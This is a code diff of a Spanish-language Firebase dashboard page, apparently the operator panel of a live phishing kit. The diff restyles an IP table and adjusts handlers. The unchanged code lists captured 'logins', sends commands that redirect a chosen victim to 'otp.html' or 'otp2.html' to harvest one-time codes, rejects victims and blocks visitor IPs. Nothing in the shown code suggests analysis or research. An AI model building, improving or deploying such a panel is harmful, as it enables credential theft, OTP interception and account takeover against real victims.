             const ipsOrdenadas = Object.entries(contadorIPs).sort((a, b) => b[1] - a[1]);
             
             if (ipsOrdenadas.length === 0) {
-                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay IPs</div>';
+                container.innerHTML = '<div style="text-align: center; padding: 50px; color: #666;">SIN IPs REGISTRADAS</div>';
                 return;
             }
 
-            let html = '<div class="col-span-3 bg-slate-800 p-6 rounded-xl">';
-            html += '<h3 class="text-xl font-bold mb-4 text-amber-400">📊 IPs por frecuencia</h3>';
-            html += '<table class="w-full text-left">';
-            html += '<tr class="text-slate-500 text-xs border-b border-slate-700"><th>IP</th><th>Intentos</th><th>Estado</th><th>Acción</th></tr>';
+            let html = '<div style="background: #0a0a0a; padding: 20px; border-radius: 10px;">';
+            html += '<h3 style="color: #6366f1; margin-bottom: 20px; font-family: Orbitron;">IPs DETECTADAS</h3>';
+            html += '<table style="width: 100%; border-collapse: collapse;">';
+            html += '<tr style="color: #666; font-size: 12px; text-align: left; border-bottom: 1px solid #333;">';
+            html += '<th style="padding: 10px;">IP</th><th>INTENTOS</th><th>ESTADO</th><th>ACCIONES</th></tr>';
             
             ipsOrdenadas.forEach(([ip, count]) => {
                 const bloqueada = datos.blacklist[ip];
-                html += `<tr class="border-b border-slate-700/30 ${bloqueada ? 'bg-red-900/30' : count >= 5 ? 'bg-amber-900/30' : ''}"><td class="py-3 font-mono ${bloqueada ? 'text-red-400' : 'text-white'}">${ip}</td><td class="py-3"><span class="badge ${count >= 10 ? 'badge-red' : count >= 5 ? 'badge-amber' : 'badge-green'}">${count}</span></td><td class="py-3 text-xs">${bloqueada ? '<span class="text-red-400">BLOQUEADA</span>' : '<span class="text-emerald-400">Activa</span>'}</td><td class="py-3"><button onclick="toggleBlockIP('${ip}')" class="btn ${bloqueada ? 'btn-green' : 'btn-red'}" style="padding: 4px 12px;">${bloqueada ? 'Desbloquear' : 'Bloquear'}</button></td></tr>`;
-            });
-            
-            html += '</table></div>';
-            container.innerHTML = html;
-        }
-
-        function renderizarBlacklist() {
-            const container = document.getElementById('container');
-            const ipsBloqueadas = Object.entries(datos.blacklist);
-            
-            if (ipsBloqueadas.length === 0) {
-                container.innerHTML = '<div class="text-slate-500 text-center col-span-3 py-10">No hay IPs bloqueadas</div>';
-                return;
-            }
-
-            let html = '<div class="col-span-3 bg-red-900/20 border border-red-500 p-6 rounded-xl">';
-            html += '<h3 class="text-xl font-bold mb-4 text-red-400">🚫 IPs Bloqueadas Permanentemente</h3>';
-            html += '<table class="w-full text-left">';
-            html += '<tr class="text-red-300 text-xs border-b border-red-700"><th>IP</th><th>Intentos</th><th>Desde</th><th>Acción</th></tr>';
-            
-            ipsBloqueadas.forEach(([ip, info]) => {
-                html += `<tr class="border-b border-red-700/30"><td class="py-3 font-mono text-red-200">${info.ip || ip}</td><td class="py-3 text-sm">${info.count || 'N/A'}</td><td class="py-3 text-sm text-red-300">${info.since ? new Date(info.since).toLocaleString() : 'N/A'}</td><td class="py-3"><button onclick="toggleBlockIP('${info.ip || ip}')" class="btn btn-green" style="padding: 4px 12px;">Desbloquear</button></td></tr>`;
+                html += `<tr style="border-bottom: 1px solid #1a1a1a;">
+                    <td style="padding: 15px 10px; font-family: monospace; color: ${bloqueada ? '#dc2626' : '#f59e0b'};">${ip}</td>
+                    <td style="padding: 15px 10px;"><span style="background: ${count >= 10 ? '#dc2626' : count >= 5 ? '#f59e0b' : '#10b981'}; color: white; padding: 2px 10px; border-radius: 10px; font-size: 11px;">${count}</span></td>
+                    <td style="padding: 15px 10px; color: ${bloqueada ? '#dc2626' : '#10b981'};">${bloqueada ? 'BLOQUEADA' : 'ACTIVA'}</td>
+                    <td style="padding: 15px 10px;">
+                        <button onclick="toggleBlockIP('${ip}')" class="btn-action ${bloqueada ? 'btn-sms1' : 'btn-delete'}" style="padding: 5px 15px; font-size: 10px;">
+                            ${bloqueada ? 'DESBLOQUEAR' : 'BLOQUEAR'}
+                        </button>
+                    </td>
+                </tr>`;
             });
             
             html += '</table></div>';
@@ -554,17 +720,15 @@
 
         function toggleBlockIP(ip) {
             if (!ip || ip === 'unknown') return;
+            const ipKey = ip.replace(/\./g, '_');
             
             if (datos.blacklist[ip]) {
                 if (confirm(`¿Desbloquear ${ip}?`)) {
-                    const ipKey = ip.replace(/\./g, '_');
                     db.ref('blacklist/' + ipKey).remove();
                 }
             } else {
-                if (confirm(`¿Bloquear PERMANENTEMENTE ${ip}?`)) {
-                    const ipKey = ip.replace(/\./g, '_');
+                if (confirm(`¿BLOQUEAR PERMANENTEMENTE ${ip}?`)) {
                     db.ref('blacklist/' + ipKey).set({ ip: ip, since: Date.now(), count: contadorIPs[ip] || 1 });
-                    
                     datos.validos.forEach(({id, data}) => {
                         if (data.ip === ip) {
                             db.ref('spam/' + id).set({...data, blocked: true});
@@ -577,21 +741,19 @@
 
         function solicitarOTP(id) {
             db.ref('comandos/' + id).set({ redirect: 'otp.html', ts: Date.now() });
-            alert('✓ Redirigiendo a otp.html');
         }
-
         function solicitarOTP2(id) {
             db.ref('comandos/' + id).set({ redirect: 'otp2.html', ts: Date.now() });
-            alert('✓ Redirigiendo a otp2.html');
         }
-
         function rechazar(id) {
             db.ref('comandos/' + id).set({ redirect: 'index.html', ts: Date.now() });
             db.ref('logins/' + id).update({ step: 'Rechazado', online: false });
         }
-
+        function eliminar(id) {
+            if (!confirm('¿Mover a spam?')) return;
+            db.ref('logins/' + id).remove();
+        }
         function recuperar(id) {
-            if (!confirm('¿Recuperar?')) return;
             db.ref('spam/' + id).once('value').then((snap) => {
                 const data = snap.val();
                 if (data) {
@@ -600,16 +762,13 @@
                 }
             });
         }
-
         function eliminarSpam(id) {
             if (!confirm('¿Eliminar permanentemente?')) return;
             db.ref('spam/' + id).remove();
         }
 
-        function eliminar(id) {
-            if (!confirm('¿Mover a papelera?')) return;
-            db.ref('logins/' + id).remove();
-        }
+        // Click en cualquier lado para activar audio (política de navegadores)
+        document.addEventListener('click', iniciarAudioContext, { once: true });
     </script>
 </body>
 </html>
